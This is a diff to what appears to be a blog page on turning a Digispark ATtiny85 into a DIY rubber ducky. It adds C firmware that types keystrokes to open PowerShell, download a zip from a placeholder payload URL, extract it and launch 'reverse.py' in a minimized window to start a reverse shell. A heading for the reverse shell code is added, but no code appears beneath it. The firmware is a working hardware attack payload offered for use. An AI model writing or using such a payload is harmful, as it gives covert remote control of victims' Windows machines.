@@ -22,14 +22,38 @@ Digispark attiny85 can be programmed in C as a rubber ducky, here can be seen in
   Your browser does not support the video tag.
 </video> 
 
-Here the powershell windows payload for the DIY rubber ducky
+Here the C windows payload for the DIY rubber ducky
 
-```powershell
-Write-Host "This is a powershell Code block";
+```c
+#include "DigiKeyboard.h"
 
-# There are many other languages you can use
-ForEach ($thing in $things) {
-    Write-Output "It highlights it using the GitHub style"
+void setup() {
+
+	DigiKeyboard.sendKeyStroke(0);
+	DigiKeyboard.delay(500);
+	DigiKeyboard.sendKeyStroke(0,MOD_GUI_LEFT);
+	DigiKeyboard.delay(1000);
+	DigiKeyboard.print("powershell");
+	DigiKeyboard.delay(500);
+	DigiKeyboard.sendKeyStroke(KEY_ENTER);
+	DigiKeyboard.delay(1000);
+	DigiKeyboard.println("wget https://embeddable-package-&-payload-URL/python-w32.zip -O python-w32.zip");
+	DigiKeyboard.sendKeyStroke(KEY_ENTER);
+	DigiKeyboard.delay(500);
+	DigiKeyboard.println("Expand-Archive -Force python-w32.zip -DestinationPath App");
+	DigiKeyboard.sendKeyStroke(KEY_ENTER);
+	DigiKeyboard.delay(500);
+	DigiKeyboard.println("cd App\\python-w32; Start-Process -WindowStyle Minimized .\\python reverse.py; exit");
+	DigiKeyboard.sendKeyStroke(KEY_ENTER);
+	  
+}
+
+void loop() {
+
 }
 ```
+
+Here the code for the reverse shell:
+
+
 
